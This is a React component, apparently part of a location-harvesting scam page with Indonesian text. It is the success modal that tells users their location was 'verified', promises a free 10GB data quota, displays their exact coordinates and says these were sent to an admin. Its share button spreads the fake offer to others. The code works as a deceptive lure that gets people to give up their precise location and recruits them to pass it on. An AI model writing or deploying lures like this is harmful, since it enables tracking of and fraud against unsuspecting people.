"use client";

import {
  Check,
  MapPin,
  Gift,
  Share2,
  Mail,
  Calendar,
  Navigation,
} from "lucide-react";
import { useState } from "react";

export default function SuccessModal({ isOpen, location, onClose }) {
  const [copied, setCopied] = useState(false);

  if (!isOpen || !location) return null;

  const copyCoordinates = () => {
    const coords = `${location.latitude}, ${location.longitude}`;
    navigator.clipboard.writeText(coords);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const shareLocation = () => {
    if (navigator.share) {
      navigator.share({
        title: "🎉 Dapatkan Kuota Gratis 10GB!",
        text: `Saya baru saja mendapatkan promo kuota gratis! Lokasi: ${location.latitude}, ${location.longitude}`,
        url: window.location.href,
      });
    }
  };

  const openMaps = () => {
    window.open(
      `https://www.google.com/maps?q=${location.latitude},${location.longitude}`,
      "_blank",
    );
  };

  const formatDate = (date) => {
    return new Date(date).toLocaleString("id-ID", {
      day: "numeric",
      month: "long",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  return (
    <div className="fixed inset-0 z-[9999]">
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/60 backdrop-blur-sm"
        onClick={onClose}
      />

      {/* Modal Container */}
      <div className="relative h-screen flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden border border-gray-200">
          {/* Success Header */}
          <div className="relative">
            <div className="absolute inset-0 bg-gradient-to-r from-green-500 to-emerald-600" />
            <div className="relative px-8 py-12 text-white text-center">
              <div className="w-24 h-24 mx-auto bg-white/20 rounded-full flex items-center justify-center mb-6 border-4 border-white/30">
                <Check className="w-12 h-12" />
              </div>
              <h2 className="text-3xl font-bold mb-3">🎉 Berhasil!</h2>
              <p className="text-white/90 text-lg">
                Lokasi Anda berhasil diverifikasi
              </p>
            </div>
          </div>

          {/* Content */}
          <div className="px-8 py-8">
            {/* Quota Announcement */}
            <div className="bg-gradient-to-r from-purple-50 to-pink-50 border border-purple-200 rounded-2xl p-6 text-center mb-8">
              <div className="w-16 h-16 mx-auto bg-gradient-to-r from-purple-600 to-pink-600 rounded-full flex items-center justify-center mb-4">
                <Gift className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-2">
                10GB KUOTA GRATIS
              </h3>
              <p className="text-gray-600">
                Akan dikirim ke nomor Anda dalam waktu
                <span className="font-bold text-purple-600"> 1x24 jam</span>
              </p>
            </div>

            {/* Location Details */}
            <div className="bg-gray-50 rounded-2xl p-6 mb-8">
              <div className="flex items-center mb-4">
                <MapPin className="w-6 h-6 text-purple-600 mr-3" />
                <h3 className="font-bold text-gray-900 text-lg">
                  📍 Koordinat Lokasi
                </h3>
              </div>

              <div className="text-center mb-6">
                <div className="text-2xl font-bold text-gray-900 font-mono mb-2">
                  {location.latitude.toFixed(6)}
                </div>
                <div className="text-2xl font-bold text-gray-900 font-mono">
                  {location.longitude.toFixed(6)}
                </div>
                <p className="text-sm text-gray-500 mt-2">
                  Akurasi: ±{location.accuracy?.toFixed(2) || "50"} meter
                </p>
              </div>

              {/* Location Actions */}
              <div className="grid grid-cols-2 gap-3">
                <button
                  onClick={copyCoordinates}
                  className="flex items-center justify-center p-3 bg-white border border-gray-300 rounded-xl hover:bg-gray-50 transition"
                >
                  {copied ? (
                    <Check className="w-5 h-5 text-green-600" />
                  ) : (
                    <>
                      <span className="text-sm font-medium">Salin</span>
                    </>
                  )}
                </button>

                <button
                  onClick={openMaps}
                  className="flex items-center justify-center p-3 bg-blue-500 text-white rounded-xl hover:bg-blue-600 transition"
                >
                  <Navigation className="w-5 h-5 mr-2" />
                  <span className="text-sm font-medium">Maps</span>
                </button>
              </div>
            </div>

            {/* Email Confirmation */}
            <div className="bg-blue-50 border border-blue-200 rounded-2xl p-5 mb-8">
              <div className="flex items-start">
                <Mail className="w-6 h-6 text-blue-600 mr-4 flex-shrink-0" />
                <div>
                  <h4 className="font-bold text-gray-900 mb-2">
                    📧 Notifikasi Terkirim
                  </h4>
                  <p className="text-gray-600 text-sm">
                    Koordinat lokasi Anda telah dikirim ke admin untuk
                    verifikasi. Proses kuota akan segera diproses.
                  </p>
                  <div className="flex items-center mt-3 text-sm text-gray-500">
                    <Calendar className="w-4 h-4 mr-2" />
                    {formatDate(location.timestamp || new Date())}
                  </div>
                </div>
              </div>
            </div>

            {/* Share Option */}
            {navigator.share && (
              <button
                onClick={shareLocation}
                className="w-full flex items-center justify-center p-4 bg-gradient-to-r from-green-500 to-emerald-600 text-white rounded-2xl mb-6 hover:from-green-600 hover:to-emerald-700 transition"
              >
                <Share2 className="w-5 h-5 mr-3" />
                <span className="font-bold">Bagikan Kabar Gembira</span>
              </button>
            )}

            {/* Close Button */}
            <button
              onClick={onClose}
              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold py-4 px-6 rounded-2xl transition"
            >
              Tutup & Lanjutkan
            </button>

            {/* Note */}
            <p className="text-center text-gray-500 text-xs mt-6">
              Jika kuota belum diterima dalam 24 jam, hubungi admin di email
              yang diberikan.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
